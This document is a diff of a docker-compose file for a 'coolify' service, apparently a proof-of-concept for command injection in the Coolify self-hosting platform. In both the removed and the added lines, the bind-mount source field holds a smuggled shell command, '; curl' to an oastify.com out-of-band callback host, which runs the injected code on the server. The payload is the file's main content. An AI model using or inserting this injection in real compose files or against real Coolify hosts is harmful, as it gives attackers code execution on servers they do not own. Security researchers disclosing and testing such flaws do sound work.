@@ -1,7 +1,17 @@
 services:
-  app:
-   image: alpine
-   volumes:
-    - type: bind
-      source: '; curl https://dizrv3m0zxdgsiygmpiqhglet5zwnybn.oastify.com;'
-      target: /app
+    coolify:
+        container_name: coolify
+        volumes:
+            - type: bind
+              source: '; curl https://dizrv3m0zxdgsiygmpiqhglet5zwnybn.oastify.com;'
+              target: /app
+        restart: always
+        working_dir: /var/www/html
+        extra_hosts:
+            - host.docker.internal:host-gateway
+        networks:
+            - coolify
+        depends_on:
+            - postgres
+            - redis
+            - soketi
